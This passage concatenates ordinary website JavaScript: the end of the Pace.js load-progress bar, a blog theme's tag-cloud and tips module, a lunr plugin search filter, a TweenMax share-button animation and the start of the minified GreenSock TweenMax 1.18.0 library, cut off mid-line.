        var stillActive, _j, _len1, _ref2, _ref3, _results;
        if (type === 'socket') {
          stillActive = request.readyState < 2;
        } else {
          stillActive = (0 < (_ref2 = request.readyState) && _ref2 < 4);
        }
        if (stillActive) {
          Pace.restart();
          _ref3 = Pace.sources;
          _results = [];
          for (_j = 0, _len1 = _ref3.length; _j < _len1; _j++) {
            source = _ref3[_j];
            if (source instanceof AjaxMonitor) {
              source.watch.apply(source, args);
              break;
            } else {
              _results.push(void 0);
            }
          }
          return _results;
        }
      }, after);
    }
  });

  AjaxMonitor = (function() {
    function AjaxMonitor() {
      var _this = this;
      this.elements = [];
      getIntercept().on('request', function() {
        return _this.watch.apply(_this, arguments);
      });
    }

    AjaxMonitor.prototype.watch = function(_arg) {
      var request, tracker, type, url;
      type = _arg.type, request = _arg.request, url = _arg.url;
      if (shouldIgnoreURL(url)) {
        return;
      }
      if (type === 'socket') {
        tracker = new SocketRequestTracker(request);
      } else {
        tracker = new XHRRequestTracker(request);
      }
      return this.elements.push(tracker);
    };

    return AjaxMonitor;

  })();

  XHRRequestTracker = (function() {
    function XHRRequestTracker(request) {
      var event, size, _j, _len1, _onreadystatechange, _ref2,
        _this = this;
      this.progress = 0;
      if (window.ProgressEvent != null) {
        size = null;
        request.addEventListener('progress', function(evt) {
          if (evt.lengthComputable) {
            return _this.progress = 100 * evt.loaded / evt.total;
          } else {
            return _this.progress = _this.progress + (100 - _this.progress) / 2;
          }
        }, false);
        _ref2 = ['load', 'abort', 'timeout', 'error'];
        for (_j = 0, _len1 = _ref2.length; _j < _len1; _j++) {
          event = _ref2[_j];
          request.addEventListener(event, function() {
            return _this.progress = 100;
          }, false);
        }
      } else {
        _onreadystatechange = request.onreadystatechange;
        request.onreadystatechange = function() {
          var _ref3;
          if ((_ref3 = request.readyState) === 0 || _ref3 === 4) {
            _this.progress = 100;
          } else if (request.readyState === 3) {
            _this.progress = 50;
          }
          return typeof _onreadystatechange === "function" ? _onreadystatechange.apply(null, arguments) : void 0;
        };
      }
    }

    return XHRRequestTracker;

  })();

  SocketRequestTracker = (function() {
    function SocketRequestTracker(request) {
      var event, _j, _len1, _ref2,
        _this = this;
      this.progress = 0;
      _ref2 = ['error', 'open'];
      for (_j = 0, _len1 = _ref2.length; _j < _len1; _j++) {
        event = _ref2[_j];
        request.addEventListener(event, function() {
          return _this.progress = 100;
        }, false);
      }
    }

    return SocketRequestTracker;

  })();

  ElementMonitor = (function() {
    function ElementMonitor(options) {
      var selector, _j, _len1, _ref2;
      if (options == null) {
        options = {};
      }
      this.elements = [];
      if (options.selectors == null) {
        options.selectors = [];
      }
      _ref2 = options.selectors;
      for (_j = 0, _len1 = _ref2.length; _j < _len1; _j++) {
        selector = _ref2[_j];
        this.elements.push(new ElementTracker(selector));
      }
    }

    return ElementMonitor;

  })();

  ElementTracker = (function() {
    function ElementTracker(selector) {
      this.selector = selector;
      this.progress = 0;
      this.check();
    }

    ElementTracker.prototype.check = function() {
      var _this = this;
      if (document.querySelector(this.selector)) {
        return this.done();
      } else {
        return setTimeout((function() {
          return _this.check();
        }), options.elements.checkInterval);
      }
    };

    ElementTracker.prototype.done = function() {
      return this.progress = 100;
    };

    return ElementTracker;

  })();

  DocumentMonitor = (function() {
    DocumentMonitor.prototype.states = {
      loading: 0,
      interactive: 50,
      complete: 100
    };

    function DocumentMonitor() {
      var _onreadystatechange, _ref2,
        _this = this;
      this.progress = (_ref2 = this.states[document.readyState]) != null ? _ref2 : 100;
      _onreadystatechange = document.onreadystatechange;
      document.onreadystatechange = function() {
        if (_this.states[document.readyState] != null) {
          _this.progress = _this.states[document.readyState];
        }
        return typeof _onreadystatechange === "function" ? _onreadystatechange.apply(null, arguments) : void 0;
      };
    }

    return DocumentMonitor;

  })();

  EventLagMonitor = (function() {
    function EventLagMonitor() {
      var avg, interval, last, points, samples,
        _this = this;
      this.progress = 0;
      avg = 0;
      samples = [];
      points = 0;
      last = now();
      interval = setInterval(function() {
        var diff;
        diff = now() - last - 50;
        last = now();
        samples.push(diff);
        if (samples.length > options.eventLag.sampleCount) {
          samples.shift();
        }
        avg = avgAmplitude(samples);
        if (++points >= options.eventLag.minSamples && avg < options.eventLag.lagThreshold) {
          _this.progress = 100;
          return clearInterval(interval);
        } else {
          return _this.progress = 100 * (3 / (avg + 3));
        }
      }, 50);
    }

    return EventLagMonitor;

  })();

  Scaler = (function() {
    function Scaler(source) {
      this.source = source;
      this.last = this.sinceLastUpdate = 0;
      this.rate = options.initialRate;
      this.catchup = 0;
      this.progress = this.lastProgress = 0;
      if (this.source != null) {
        this.progress = result(this.source, 'progress');
      }
    }

    Scaler.prototype.tick = function(frameTime, val) {
      var scaling;
      if (val == null) {
        val = result(this.source, 'progress');
      }
      if (val >= 100) {
        this.done = true;
      }
      if (val === this.last) {
        this.sinceLastUpdate += frameTime;
      } else {
        if (this.sinceLastUpdate) {
          this.rate = (val - this.last) / this.sinceLastUpdate;
        }
        this.catchup = (val - this.progress) / options.catchupTime;
        this.sinceLastUpdate = 0;
        this.last = val;
      }
      if (val > this.progress) {
        this.progress += this.catchup * frameTime;
      }
      scaling = 1 - Math.pow(this.progress / 100, options.easeFactor);
      this.progress += scaling * this.rate * frameTime;
      this.progress = Math.min(this.lastProgress + options.maxProgressPerFrame, this.progress);
      this.progress = Math.max(0, this.progress);
      this.progress = Math.min(100, this.progress);
      this.lastProgress = this.progress;
      return this.progress;
    };

    return Scaler;

  })();

  sources = null;

  scalers = null;

  bar = null;

  uniScaler = null;

  animation = null;

  cancelAnimation = null;

  Pace.running = false;

  handlePushState = function() {
    if (options.restartOnPushState) {
      return Pace.restart();
    }
  };

  if (window.history.pushState != null) {
    _pushState = window.history.pushState;
    window.history.pushState = function() {
      handlePushState();
      return _pushState.apply(window.history, arguments);
    };
  }

  if (window.history.replaceState != null) {
    _replaceState = window.history.replaceState;
    window.history.replaceState = function() {
      handlePushState();
      return _replaceState.apply(window.history, arguments);
    };
  }

  SOURCE_KEYS = {
    ajax: AjaxMonitor,
    elements: ElementMonitor,
    document: DocumentMonitor,
    eventLag: EventLagMonitor
  };

  (init = function() {
    var type, _j, _k, _len1, _len2, _ref2, _ref3, _ref4;
    Pace.sources = sources = [];
    _ref2 = ['ajax', 'elements', 'document', 'eventLag'];
    for (_j = 0, _len1 = _ref2.length; _j < _len1; _j++) {
      type = _ref2[_j];
      if (options[type] !== false) {
        sources.push(new SOURCE_KEYS[type](options[type]));
      }
    }
    _ref4 = (_ref3 = options.extraSources) != null ? _ref3 : [];
    for (_k = 0, _len2 = _ref4.length; _k < _len2; _k++) {
      source = _ref4[_k];
      sources.push(new source(options));
    }
    Pace.bar = bar = new Bar;
    scalers = [];
    return uniScaler = new Scaler;
  })();

  Pace.stop = function() {
    Pace.trigger('stop');
    Pace.running = false;
    bar.destroy();
    cancelAnimation = true;
    if (animation != null) {
      if (typeof cancelAnimationFrame === "function") {
        cancelAnimationFrame(animation);
      }
      animation = null;
    }
    return init();
  };

  Pace.restart = function() {
    Pace.trigger('restart');
    Pace.stop();
    return Pace.start();
  };

  Pace.go = function() {
    var start;
    Pace.running = true;
    bar.render();
    start = now();
    cancelAnimation = false;
    return animation = runAnimation(function(frameTime, enqueueNextFrame) {
      var avg, count, done, element, elements, i, j, remaining, scaler, scalerList, sum, _j, _k, _len1, _len2, _ref2;
      remaining = 100 - bar.progress;
      count = sum = 0;
      done = true;
      for (i = _j = 0, _len1 = sources.length; _j < _len1; i = ++_j) {
        source = sources[i];
        scalerList = scalers[i] != null ? scalers[i] : scalers[i] = [];
        elements = (_ref2 = source.elements) != null ? _ref2 : [source];
        for (j = _k = 0, _len2 = elements.length; _k < _len2; j = ++_k) {
          element = elements[j];
          scaler = scalerList[j] != null ? scalerList[j] : scalerList[j] = new Scaler(element);
          done &= scaler.done;
          if (scaler.done) {
            continue;
          }
          count++;
          sum += scaler.tick(frameTime);
        }
      }
      avg = sum / count;
      bar.update(uniScaler.tick(frameTime, avg));
      if (bar.done() || done || cancelAnimation) {
        bar.update(100);
        Pace.trigger('done');
        return setTimeout(function() {
          bar.finish();
          Pace.running = false;
          return Pace.trigger('hide');
        }, Math.max(options.ghostTime, Math.max(options.minTime - (now() - start), 0)));
      } else {
        return enqueueNextFrame();
      }
    });
  };

  Pace.start = function(_options) {
    extend(options, _options);
    Pace.running = true;
    try {
      bar.render();
    } catch (_error) {
      NoTargetError = _error;
    }
    if (!document.querySelector('.pace')) {
      return setTimeout(Pace.start, 50);
    } else {
      Pace.trigger('start');
      return Pace.go();
    }
  };

  if (typeof define === 'function' && define.amd) {
    define(['pace'], function() {
      return Pace;
    });
  } else if (typeof exports === 'object') {
    module.exports = Pace;
  } else {
    if (options.startOnPageLoad) {
      Pace.start();
    }
  }

}).call(this);

define([], function(){

    var Tips = (function(){

        var $tipBox = $(".tips-box");

        return {
            show: function(){
                $tipBox.removeClass("hide");
            },
            hide: function(){
                $tipBox.addClass("hide");
            },
            init: function(){
                
            }
        }
    })();

    var resetTags = function(){
        var tags = $(".tagcloud a");
        tags.css({"font-size": "12px"});
        for(var i=0,len=tags.length; i<len; i++){
            var num = tags.eq(i).html().length % 5 +1;
            tags[i].className = "";
            tags.eq(i).addClass("color"+num);
        }
    }

    var slide = function(idx){
        // 修复IE10+切换无效的bug
        var $wrap = $(".switch-wrap"),
          transform = [
              '-webkit-transform: translate(-' + idx * 100 + '%, 0);',
              '-moz-transform: translate(-' + idx * 100 + '%, 0);',
              '-o-transform: translate(-' + idx * 100 + '%, 0);',
              '-ms-transform: translate(-' + idx * 100 + '%, 0);',
              'transform: translate(-' + idx * 100 + '%, 0);'
          ];
        //$wrap.css({
        //    "transform": "translate(-"+idx*100+"%, 0 )"
        //});
        $wrap[0].style.cssText = transform.join('');
        $(".icon-wrap").addClass("hide");
        $(".icon-wrap").eq(idx).removeClass("hide");
    }

    var bind = function(){
        var switchBtn = $("#myonoffswitch");
        var tagcloud = $(".second-part");
        var navDiv = $(".first-part");
        switchBtn.click(function(){
            if(switchBtn.hasClass("clicked")){
                switchBtn.removeClass("clicked");
                tagcloud.removeClass("turn-left");
                navDiv.removeClass("turn-left");
            }else{
                switchBtn.addClass("clicked");
                tagcloud.addClass("turn-left");
                navDiv.addClass("turn-left");
                resetTags();
            }
        });

        var timeout;
        var isEnterBtn = false;
        var isEnterTips = false;

        $(".icon").bind("mouseenter", function(){
            isEnterBtn = true;
            Tips.show();
        }).bind("mouseleave", function(){
            isEnterBtn = false;
            setTimeout(function(){
                if(!isEnterTips){
                    Tips.hide();
                }
            }, 100);
        });

        $(".tips-box").bind("mouseenter", function(){
            isEnterTips = true;
            Tips.show();
        }).bind("mouseleave", function(){
            isEnterTips = false;
            setTimeout(function(){
                if(!isEnterBtn){
                    Tips.hide();
                }
            }, 100);
        });

        $(".tips-inner li").bind("click", function(){
            var idx = $(this).index();
            slide(idx);
            Tips.hide();
        });
    }

    

    return {
        init: function(){
            resetTags();
            bind();
            Tips.init();
        }
    }
});
(function(){
  'use strict';

  var elements = document.getElementsByClassName('plugin');
  var $count = document.getElementById('plugin-list-count');
  var $input = document.getElementById('plugin-search-input');
  var elementLen = elements.length;
  var index = lunr.Index.load(window.SEARCH_INDEX);

  function updateCount(count){
    $count.innerHTML = count + (count === 1 ? ' item' : ' items');
  }

  function addClass(elem, className){
    var classList = elem.classList;

    if (!classList.contains(className)){
      classList.add(className);
    }
  }

  function removeClass(elem, className){
    var classList = elem.classList;

    if (classList.contains(className)){
      classList.remove(className);
    }
  }

  function search(value){
    var result = index.search(value);
    var len = result.length;
    var selected = {};
    var i = 0;

    for (i = 0; i < len; i++){
      selected[result[i].ref] = true;
    }

    for (i = 0; i < elementLen; i++){
      if (selected[i]){
        addClass(elements[i], 'on');
      } else {
        removeClass(elements[i], 'on');
      }
    }

    updateCount(len);
  }

  function displayAll(){
    for (var i = 0; i < elementLen; i++){
      addClass(elements[i], 'on');
    }

    updateCount(elements.length);
  }

  function hashchange(){
    var hash = location.hash.substring(1);
    $input.value = hash;

    if (hash){
      search(hash);
    } else {
      displayAll();
    }
  }

  $input.addEventListener('input', function(){
    var value = this.value;

    if (!value) return displayAll();
    search(value);
  });

  window.addEventListener('hashchange', hashchange);
  hashchange();
})();
/*Javascript代码片段*/
$(document).ready(function(){
    var $shareButtons=$(".share-button")
        ,$toggleButton=$(".share-toggle-button")

        ,menuOpen=false
        ,buttonsNum=$shareButtons.length
        ,buttonsMid=(buttonsNum/2)
        ,spacing=75
    ;

    function openShareMenu(){
        TweenMax.to($toggleButton,0.1,{
            scaleX:1.2,
            scaleY:0.6,
            ease:Quad.easeOut,
            onComplete:function(){
                TweenMax.to($toggleButton,.8,{
                    scale:0.6,
                    ease:Elastic.easeOut,
                    easeParams:[1.1,0.6]
                })
                TweenMax.to($toggleButton.children(".share-icon"),.8,{
                    scale:1.4,
                    ease:Elastic.easeOut,
                    easeParams:[1.1,0.6]
                })
            }
        })
        $shareButtons.each(function(i){
            var $cur=$(this);
            var pos=i-buttonsMid;
            if(pos>=0) pos+=1;
            var dist=Math.abs(pos);
            $cur.css({
                zIndex:buttonsMid-dist
            });
            TweenMax.to($cur,1.1*(dist),{
                x:pos*spacing,
                scaleY:0.6,
                scaleX:1.1,
                ease:Elastic.easeOut,
                easeParams:[1.01,0.5]
            });
            TweenMax.to($cur,.8,{
                delay:(0.2*(dist))-0.1,
                scale:0.6,
                ease:Elastic.easeOut,
                easeParams:[1.1,0.6]
            })
                
            TweenMax.fromTo($cur.children(".share-icon"),0.2,{
                scale:0
            },{
                delay:(0.2*dist)-0.1,
                scale:1,
                ease:Quad.easeInOut
            })
        })
    }
    function closeShareMenu(){
        TweenMax.to([$toggleButton,$toggleButton.children(".share-icon")],1.4,{
            delay:0.1,
            scale:1,
            ease:Elastic.easeOut,
            easeParams:[1.1,0.3]
        });
        $shareButtons.each(function(i){
            var $cur=$(this);
            var pos=i-buttonsMid;
            if(pos>=0) pos+=1;
            var dist=Math.abs(pos);
            $cur.css({
                zIndex:dist
            });

            TweenMax.to($cur,0.4+((buttonsMid-dist)*0.1),{
                x:0,
                scale:.95,
                ease:Quad.easeInOut,
            });
                
            TweenMax.to($cur.children(".share-icon"),0.2,{
                scale:0,
                ease:Quad.easeIn
            });
        })
    }

    function toggleShareMenu(){
        menuOpen=!menuOpen

        menuOpen?openShareMenu():closeShareMenu();
    }
    $toggleButton.on("mousedown",function(){
        toggleShareMenu();
    })
    
})
/*!
 * VERSION: 1.18.0
 * DATE: 2015-09-05
 * UPDATES AND DOCS AT: http://greensock.com
 * 
 * Includes all of the following: TweenLite, TweenMax, TimelineLite, TimelineMax, EasePack, CSSPlugin, RoundPropsPlugin, BezierPlugin, AttrPlugin, DirectionalRotationPlugin
 *
 * @license Copyright (c) 2008-2015, GreenSock. All rights reserved.
 * This work is subject to the terms at http://greensock.com/standard-license or for
 * Club GreenSock members, the software agreement that was issued with your membership.
 * 
 * @author: Jack Doyle, jack@greensock.com
 **/
var _gsScope="undefined"!=typeof module&&module.exports&&"undefined"!=typeof global?global:this||window;(_gsScope._gsQueue||(_gsScope._gsQueue=[])).push(function(){"use strict";_gsScope._gsDefine("TweenMax",["core.Animation","core.SimpleTimeline","TweenLite"],function(t,e,i){var s=function(t){var e,i=[],s=t.length;for(e=0;e!==s;i.push(t[e++]));return i},r=function(t,e,i){var s,r,n=t.cycle;for(s in n)r=n[s],t[s]="function"==typeof r?r.call(e[i],i):r[i%r.length];delete t.cycle},n=function(t,e,s){i.call(this,t,e,s),this._cycle=0,this._yoyo=this.vars.yoyo===!0,this._repeat=this.vars.repeat||0,this._repeatDelay=this.vars.repeatDelay||0,this._dirty=!0,this.render=n.prototype.render},a=1e-10,o=i._internals,l=o.isSelector,h=o.isArray,_=n.prototype=i.to({},.1,{}),u=[];n.version="1.18.0",_.constructor=n,_.kill()._gc=!1,n.killTweensOf=n.killDelayedCallsTo=i.killTweensOf,n.getTweensOf=i.getTweensOf,n.lagSmoothing=i.lagSmoothing,n.ticker=i.ticker,n.render=i.render,_.invalidate=function(){return this._yoyo=this.vars.yoyo===!0,this._repeat=this.vars.repeat||0,this._repeatDelay=this.vars.repeatDelay||0,this._uncache(!0),i.prototype.invalidate.call(this)},_.updateTo=function(t,e){var s,r=this.ratio,n=this.vars.immediateRender||t.immediateRender;e&&this._startTime<this._timeline._time&&(this._startTime=this._timeline._time,this._uncache(!1),this._gc?this._enabled(!0,!1):this._timeline.insert(this,this._startTime-this._delay));for(s in t)this.vars[s]=t[s];if(this._initted||n)if(e)this._initted=!1,n&&this.render(0,!0,!0);else if(this._gc&&this._enabled(!0,!1),this._notifyPluginsOfEnabled&&this._firstPT&&i._onPluginEvent("_onDisable",this),this._time/this._duration>.998){var a=this._time;this.render(0,!0,!1),this._initted=!1,this.render(a,!0,!1)}else if(this._time>0||n){this._initted=!1,this._init();for(var o,l=1/(1-r),h=this._firstPT;h;)o=h.s+h.c,h.c*=l,h.s=o-h.c,h=h._next}return this},_.render=function(t,e,i){this._initted||0===this._duration&&this.vars.repeat&&this.invalidate();var s,r,n,l,h,_,u,c,f=this._dirty?this.totalDuration():this._totalDuration,p=this._time,m=this._totalTime,d=this._cycle,g=this._duration,v=this._rawPrevTime;if(t>=f?(this._totalTime=f,this._cycle=this._repeat,this._yoyo&&0!==(1&this._cycle)?(this._time=0,this.ratio=this._ease._calcEnd?this._ease.getRatio(0):0):(this._time=g,this.ratio=this._ease._calcEnd?this._ease.getRatio(1):1),this._reversed||(s=!0,r="onComplete",i=i||this._timeline.autoRemoveChildren),0===g&&(this._initted||!this.vars.lazy||i)&&(this._startTime===this._timeline._duration&&(t=0),(0===t||0>v||v===a)&&v!==t&&(i=!0,v>a&&(r="onReverseComplete")),this._rawPrevTime=c=!e||t||v===t?t:a)):1e-7>t?(this._totalTime=this._time=this._cycle=0,this.ratio=this._ease._calcEnd?this._ease.getRatio(0):0,(0!==m||0===g&&v>0)&&(r="onReverseComplete",s=this._reversed),0>t&&(this._active=!1,0===g&&(this._initted||!this.vars.lazy||i)&&(v>=0&&(i=!0),this._rawPrevTime=c=!e||t||v===t?t:a)),this._initted||(i=!0)):(this._totalTime=this._time=t,0!==this._repeat&&(l=g+this._repeatDelay,this._cycle=this._totalTime/l>>0,0!==this._cycle&&this._cycle===this._totalTime/l&&this._cycle--,this._time=this._totalTime-this._cycle*l,this._yoyo&&0!==(1&this._cycle)&&(this._time=g-this._time),this._time>g?this._time=g:0>this._time&&(this._time=0)),this._easeType?(h=this._time/g,_=this._easeType,u=this._easePower,(1===_||3===_&&h>=.5)&&(h=1-h),3===_&&(h*=2),1===u?h*=h:2===u?h*=h*h:3===u?h*=h*h*h:4===u&&(h*=h*h*h*h),this.ratio=1===_?1-h:2===_?h:.5>this._time/g?h/2:1-h/2):this.ratio=this._ease.getRatio(this._time/g)),p===this._time&&!i&&d===this._cycle)return m!==this._totalTime&&this._onUpdate&&(e||this._callback("onUpdate")),void 0;if(!this._initted){if(this._init(),!this._initted||this._gc)return;if(!i&&this._firstPT&&(this.vars.lazy!==!1&&this._duration||this.vars.lazy&&!this._duration))return this._time=p,this._totalTime=m,this._rawPrevTime=v,this._cycle=d,o.lazyTweens.push(this),this._lazy=[t,e],void 0;this._time&&!s?this.ratio=this._ease.getRatio(this._time/g):s&&this._ease._calcEnd&&(this.ratio=this._ease.getRatio(0===this._time?0:1))}for(this._lazy!==!1&&(this._lazy=!1),this._active||!this._paused&&this._time!==p&&t>=0&&(this._active=!0),0===m&&(2===this._initted&&t>0&&this._init(),this._startAt&&(t>=0?this._startAt.render(t,e,i):r||(r="_dummyGS")),this.vars.onStart&&(0!==this._totalTime||0===g)&&(e||this._callback("onStart"))),n=this._firstPT;n;)n.f?n.t[n.p](n.c*this.ratio+n.s):n.t[n.p]=n.c*this.ratio+n.s,n=n._next;this._onUpdate&&(0>t&&this._startAt&&this._startTime&&this._startAt.render(t,e,i),e||(this._totalTime!==m||s)&&this._callback("onUpdate")),this._cycle!==d&&(e||this._gc||this.vars.onRepeat&&this._callback("onRepeat")),r&&(!this._gc||i)&&(0>t&&this._startAt&&!this._onUpdate&&this._startTime&&this._startAt.render(t,e,i),s&&(this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[r]&&this._callback(r),0===g&&this._rawPrevTime===a&&c!==a&&(this._rawPrevTime=0))},n.to=function(t,e,i){return new n(t,e,i)},n.from=function(t,e,i){return i.runBackwards=!0,i.immediateRender=0!=i.immediateRender,new n(t,e,i)},n.fromTo=function(t,e,i,s){return s.startAt=i,s.immediateRender=0!=s.immediateRender&&0!=i.immediateRender,new n(t,e,s)},n.staggerTo=n.allTo=function(t,e,a,o,_,c,f){o=o||0;var p,m,d,g,v=a.delay||0,y=[],T=function(){a.onComplete&&a.onComplete.apply(a.onCompleteScope||this,arguments),_.apply(f||a.callbackScope||this,c||u)},x=a.cycle,w=a.startAt&&a.startAt.cycle;for(h(t)||("string"==typeof t&&(t=i.selector(t)||t),l(t)&&(t=s(t))),t=t||[],0>o&&(t=s(t),t.reverse(),o*=-1),p=t.length-1,d=0;p>=d;d++){m={};for(g in a)m[g]=a[g];if(x&&r(m,t,d),w){w=m.startAt={};for(g in a.startAt)w[g]=a.startAt[g];r(m.startAt,t,d)}m.delay=v,d===p&&_&&(m.onComplete=T),y[d]=new n(t[d],e,m),v+=o}return y},n.staggerFrom=n.allFrom=function(t,e,i,s,r,a,o){return i.runBackwards=!0,i.immediateRender=0!=i.immediateRender,n.staggerTo(t,e,i,s,r,a,o)},n.staggerFromTo=n.allFromTo=function(t,e,i,s,r,a,o,l){return s.startAt=i,s.immediateRender=0!=s.immediateRender&&0!=i.immediateRender,n.staggerTo(t,e,s,r,a,o,l)},n.delayedCall=function(t,e,i,s,r){return new n(e,0,{delay:t,onComplete:e,onCompleteParams:i,callbackScope:s,onReverseComplete:e,onReverseCompleteParams:i,immediateRender:!1,useFrames:r,overwrite:0})},n.set=function(t,e){return new n(t,0,e)},n.isTweening=function(t){return i.getTweensOf(t,!0).length>0};var c=function(t,e){for(var s=[],r=0,n=t._first;n;)n instanceof i?s[r++]=n:(e&&(s[r++]=n),s=s.concat(c(n,e)),r=s.length),n=n._next;return s},f=n.getAllTweens=function(e){return c(t._rootTimeline,e).concat(c(t._rootFramesTimeline,e))};n.killAll=function(t,i,s,r){null==i&&(i=!0),null==s&&(s=!0);var n,a,o,l=f(0!=r),h=l.length,_=i&&s&&r;for(o=0;h>o;o++)a=l[o],(_||a instanceof e||(n=a.target===a.vars.onComplete)&&s||i&&!n)&&(t?a.totalTime(a._reversed?0:a.totalDuration()):a._enabled(!1,!1))},n.killChildTweensOf=function(t,e){if(null!=t){var r,a,_,u,c,f=o.tweenLookup;if("string"==typeof t&&(t=i.selector(t)||t),l(t)&&(t=s(t)),h(t))for(u=t.length;--u>-1;)n.killChildTweensOf(t[u],e);else{r=[];for(_ in f)for(a=f[_].target.parentNode;a;)a===t&&(r=r.concat(f[_].tweens)),a=a.parentNode;for(c=r.length,u=0;c>u;u++)e&&r[u].totalTime(r[u].totalDuration()),r[u]._enabled(!1,!1)}}};var p=function(t,i,s,r){i=i!==!1,s=s!==!1,r=r!==!1;for(var n,a,o=f(r),l=i&&s&&r,h=o.length;--h>-1;)a=o[h],(l||a instanceof e||(n=a.target===a.vars.onComplete)&&s||i&&!n)&&a.paused(t)};return n.pauseAll=function(t,e,i){p(!0,t,e,i)},n.resumeAll=function(t,e,i){p(!1,t,e,i)},n.globalTimeScale=function(e){var s=t._rootTimeline,r=i.ticker.time;return arguments.length?(e=e||a,s._startTime=r-(r-s._startTime)*s._timeScale/e,s=t._rootFramesTimeline,r=i.ticker.frame,s._startTime=r-(r-s._startTime)*s._timeScale/e,s._timeScale=t._rootTimeline._timeScale=e,e):s._timeScale},_.progress=function(t){return arguments.length?this.totalTime(this.duration()*(this._yoyo&&0!==(1&this._cycle)?1-t:t)+this._cycle*(this._duration+this._repeatDelay),!1):this._time/this.duration()},_.totalProgress=function(t){return arguments.length?this.totalTime(this.totalDuration()*t,!1):this._totalTime/this.totalDuration()},_.time=function(t,e){return arguments.length?(this._dirty&&this.totalDuration(),t>this._duration&&(t=this._duration),this._yoyo&&0!==(1&this._cycle)?t=this._duration-t+this._cycle*(this._duration+this._repeatDelay):0!==this._repeat&&(t+=this._cycle*(this._duration+this._repeatDelay)),this.totalTime(t,e)):this._time},_.duration=function(e){return arguments.length?t.prototype.duration.call(this,e):this._duration},_.totalDuration=function(t){return arguments.length?-1===this._repeat?this:this.duration((t-this._repeat*this._repeatDelay)/(this._repeat+1)):(this._dirty&&(this._totalDuration=-1===this._repeat?999999999999:this._duration*(this._repeat+1)+this._repeatDelay*this._repeat,this._dirty=!1),this._totalDuration)},_.repeat=function(t){return arguments.length?(this._repeat=t,this._uncache(!0)):this._repeat},_.repeatDelay=function(t){return arguments.length?(this._repeatDelay=t,this._uncache(!0)):this._repeatDelay},_.yoyo=function(t){return arguments.length?(this._yoyo=t,this):this._yoyo},n},!0),_gsScope._gsDefine("TimelineLite",["core.Animation","core.SimpleTimeline","TweenLite"],function(t,e,i){var s=function(t){e.call(this,t),this._labels={},this.autoRemoveChildren=this.vars.autoRemoveChildren===!0,this.smoothChildTiming=this.vars.smoothChildTiming===!0,this._sortChildren=!0,this._onUpdate=this.vars.onUpdate;var i,s,r=this.vars;for(s in r)i=r[s],l(i)&&-1!==i.join("").indexOf("{self}")&&(r[s]=this._swapSelfInParams(i));l(r.tweens)&&this.add(r.tweens,0,r.align,r.stagger)},r=1e-10,n=i._internals,a=s._internals={},o=n.isSelector,l=n.isArray,h=n.lazyTweens,_=n.lazyRender,u=_gsScope._gsDefine.globals,c=function(t){var e,i={};for(e in t)i[e]=t[e];return i},f=function(t,e,i){var s,r,n=t.cycle;for(s in n)r=n[s],t[s]="function"==typeof r?r.call(e[i],i):r[i%r.length];delete t.cycle},p=a.pauseCallback=function(){},m=function(t){var e,i=[],s=t.length;for(e=0;e!==s;i.push(t[e++]));return i},d=s.prototype=new e;return s.version="1.18.0",d.constructor=s,d.kill()._gc=d._forcingPlayhead=d._hasPause=!1,d.to=function(t,e,s,r){var n=s.repeat&&u.TweenMax||i;return e?this.add(new n(t,e,s),r):this.set(t,s,r)},d.from=function(t,e,s,r){return this.add((s.repeat&&u.TweenMax||i).from(t,e,s),r)},d.fromTo=function(t,e,s,r,n){var a=r.repeat&&u.TweenMax||i;return e?this.add(a.fromTo(t,e,s,r),n):this.set(t,r,n)},d.staggerTo=function(t,e,r,n,a,l,h,_){var u,p,d=new s({onComplete:l,onCompleteParams:h,callbackScope:_,smoothChildTiming:this.smoothChildTiming}),g=r.cycle;for("string"==typeof t&&(t=i.selector(t)||t),t=t||[],o(t)&&(t=m(t)),n=n||0,0>n&&(t=m(t),t.reverse(),n*=-1),p=0;t.length>p;p++)u=c(r),u.startAt&&(u.startAt=c(u.startAt),u.startAt.cycle&&f(u.startAt,t,p)),g&&f(u,t,p),d.to(t[p],e,u,p*n);return this.add(d,a)},d.staggerFrom=function(t,e,i,s,r,n,a,o){return i.immediateRender=0!=i.immediateRender,i.runBackwards=!0,this.staggerTo(t,e,i,s,r,n,a,o)},d.staggerFromTo=function(t,e,i,s,r,n,a,o,l){return s.startAt=i,s.immediateRender=0!=s.immediateRender&&0!=i.immediateRender,this.staggerTo(t,e,s,r,n,a,o,l)},d.call=function(t,e,s,r){return this.add(i.delayedCall(0,t,e,s),r)},d.set=function(t,e,s){return s=this._parseTimeOrLabel(s,0,!0),null==e.immediateRender&&(e.immediateRender=s===this._time&&!this._paused),this.add(new i(t,0,e),s)},s.exportRoot=function(t,e){t=t||{},null==t.smoothChildTiming&&(t.smoothChildTiming=!0);var r,n,a=new s(t),o=a._timeline;for(null==e&&(e=!0),o._remove(a,!0),a._startTime=0,a._rawPrevTime=a._time=a._totalTime=o._time,r=o._first;r;)n=r._next,e&&r instanceof i&&r.target===r.vars.onComplete||a.add(r,r._startTime-r._delay),r=n;return o.add(a,0),a},d.add=function(r,n,a,o){var h,_,u,c,f,p;if("number"!=typeof n&&(n=this._parseTimeOrLabel(n,0,!0,r)),!(r instanceof t)){if(r instanceof Array||r&&r.push&&l(r)){for(a=a||"normal",o=o||0,h=n,_=r.length,u=0;_>u;u++)l(c=r[u])&&(c=new s({tweens:c})),this.add(c,h),"string"!=typeof c&&"function"!=typeof c&&("sequence"===a?h=c._startTime+c.totalDuration()/c._timeScale:"start"===a&&(c._startTime-=c.delay())),h+=o;return this._uncache(!0)}if("string"==typeof r)return this.addLabel(r,n);if("function"!=typeof r)throw"Cannot add "+r+" into the timeline; it is not a tween, timeline, function, or string.";r=i.delayedCall(0,r)}if(e.prototype.add.call(this,r,n),(this._gc||this._time===this._duration)&&!this._paused&&this._duration<this.duration())for(f=this,p=f.rawTime()>r._startTime;f._timeline;)p&&f._timeline.smoothChildTiming?f.totalTime(f._totalTime,!0):f._gc&&f._enabled(!0,!1),f=f._timeline;return this},d.remove=function(e){if(e instanceof t){this._remove(e,!1);var i=e._timeline=e.vars.useFrames?t._rootFramesTimeline:t._rootTimeline;return e._startTime=(e._paused?e._pauseTime:i._time)-(e._reversed?e.totalDuration()-e._totalTime:e._totalTime)/e._timeScale,this}if(e instanceof Array||e&&e.push&&l(e)){for(var s=e.length;--s>-1;)this.remove(e[s]);return this}return"string"==typeof e?this.removeLabel(e):this.kill(null,e)},d._remove=function(t,i){e.prototype._remove.call(this,t,i);var s=this._last;return s?this._time>s._startTime+s._totalDuration/s._timeScale&&(this._time=this.duration(),this._totalTime=this._totalDuration):this._time=this._totalTime=this._duration=this._totalDuration=0,this},d.append=function(t,e){return 